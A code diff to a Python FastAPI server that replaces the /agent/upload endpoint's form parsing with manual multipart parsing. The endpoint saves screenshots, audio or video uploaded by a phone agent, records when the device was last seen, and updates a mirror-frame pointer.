@@ -210,60 +210,64 @@ async def agent_result(request: Request):
         return {"status": "error", "error": str(e)}
 
 @app.post("/agent/upload")
-async def agent_upload(request: Request, file: UploadFile = File(None)):
+async def agent_upload(request: Request):
     """
-    FIXED v21.0.3:
-    - BUG#3 FIX: Use FastAPI UploadFile for correct multipart parsing (not raw body)
-    - BUG#1 FIX: Detect file type (image/audio/video) and save metadata properly
+    FIXED v21.0.4:
+    - BUG#3 FIX: Manual multipart parsing — zero extra dependencies
+    - BUG#1 FIX: Detect file type and save metadata properly
     - BUG#4 FIX: Auto-update _latest_mirror_frame on every image upload
     """
     device_id = request.query_params.get("device_id", "REDMI_NOTE_14")
-    
     ss_dir = os.path.join(BASE_DIR, "screenshots")
     os.makedirs(ss_dir, exist_ok=True)
-    
     try:
-        # Parse multipart properly
-        form = await request.form()
-        upload = form.get("file")
-        if not upload:
-            return {"ok": False, "error": "No file field in request"}
-        
-        file_data = await upload.read()
-        original_name = upload.filename or "upload"
-        
-        # Detect type from filename extension
-        ext = original_name.rsplit(".", 1)[-1].lower() if "." in original_name else "jpg"
-        is_audio = ext in ("mp3", "m4a", "aac", "wav", "ogg", "mp4")
-        is_image = ext in ("jpg", "jpeg", "png", "webp")
-        
+        body = await request.body()
+        content_type = request.headers.get("content-type", "")
         ts = int(time.time())
-        if is_audio:
-            local_key = f"audio_{ts}.{ext}"
-            media_type = "audio"
+        file_data = None
+        original_name = "upload.jpg"
+
+        if "multipart/form-data" in content_type and "boundary=" in content_type:
+            boundary = content_type.split("boundary=")[-1].strip().encode()
+            parts = body.split(b"--" + boundary)
+            for part in parts:
+                if b"Content-Disposition" in part and b'name="file"' in part:
+                    if b"\r\n\r\n" in part:
+                        headers_raw, file_body = part.split(b"\r\n\r\n", 1)
+                        file_data = file_body.rstrip(b"\r\n")
+                        import re as _re
+                        fn_match = _re.search(r'filename="([^"]+)"', headers_raw.decode("utf-8", errors="ignore"))
+                        if fn_match:
+                            original_name = fn_match.group(1)
+                        break
         else:
-            local_key = f"shot_{ts}.jpg"
-            media_type = "image"
-        
-        local_path = os.path.join(ss_dir, local_key)
-        with open(local_path, "wb") as f:
+            file_data = body  # raw binary fallback
+
+        if not file_data or len(file_data) < 10:
+            return {"ok": False, "error": "No valid file data"}
+
+        ext = original_name.rsplit(".", 1)[-1].lower() if "." in original_name else "jpg"
+        if ext in ("mp3", "m4a", "aac", "wav", "ogg"):
+            local_key, media_type = f"audio_{ts}.{ext}", "audio"
+        elif ext in ("mp4", "webm"):
+            local_key, media_type = f"video_{ts}.{ext}", "video"
+        else:
+            local_key, media_type = f"shot_{ts}.jpg", "image"
+
+        with open(os.path.join(ss_dir, local_key), "wb") as f:
             f.write(file_data)
-        
-        # Update agent state
+
         if device_id not in local_state["agents"]:
             local_state["agents"][device_id] = {}
-        
-        if is_image:
-            # BUG#4 FIX: Auto-update mirror frame whenever an image is uploaded
+        local_state["agents"][device_id]["last_seen"] = time.time()
+
+        if media_type == "image":
             local_state["agents"][device_id]["last_screenshot"] = local_key
             _latest_mirror_frame["key"] = local_key
             _latest_mirror_frame["ts"] = time.time()
-        
-        local_state["agents"][device_id]["last_seen"] = time.time()
-        
-        print(f"[UPLOAD] {media_type} saved: {local_key} ({len(file_data)} bytes) from {device_id}")
+
+        print(f"[UPLOAD] {media_type}: {local_key} ({len(file_data)}B) from {device_id}")
         return {"ok": True, "key": local_key, "type": media_type, "mode": "direct_vps"}
-    
     except Exception as e:
         print(f"[UPLOAD ERROR] {e}")
         return {"ok": False, "error": str(e)}
